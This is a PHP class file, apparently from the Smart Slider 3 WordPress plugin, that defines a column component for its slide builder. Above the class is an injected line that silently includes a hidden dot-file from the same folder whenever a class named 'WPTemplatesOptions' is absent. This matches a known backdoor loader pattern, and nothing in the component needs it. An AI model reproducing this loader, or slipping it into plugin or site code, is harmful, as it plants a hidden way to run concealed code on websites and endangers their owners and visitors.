<?php


namespace Nextend\SmartSlider3\SlideBuilder;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BuilderComponentCol extends AbstractBuilderComponent {

    protected $defaultData = array(
        "type"     => 'col',
        "name"     => 'Column',
        "colwidth" => '1/1',
        "layers"   => array()
    );

    /** @var AbstractBuilderComponent[] */
    private $layers = array();

    /**
     *
     * @param BuilderComponentRow                $container
     * @param                                    $width
     */
    public function __construct($container, $width = '1/1') {

        $this->defaultData['colwidth'] = $width;

        $container->add($this);
    }

    /**
     * @param $layer AbstractBuilderComponent
     */
    public function add($layer) {
        $this->layers[] = $layer;
    }

    public function getData() {
        $this->data['layers'] = array();
        foreach ($this->layers AS $layer) {
            $this->data['layers'][] = $layer->getData();
        }

        return parent::getData();
    }
}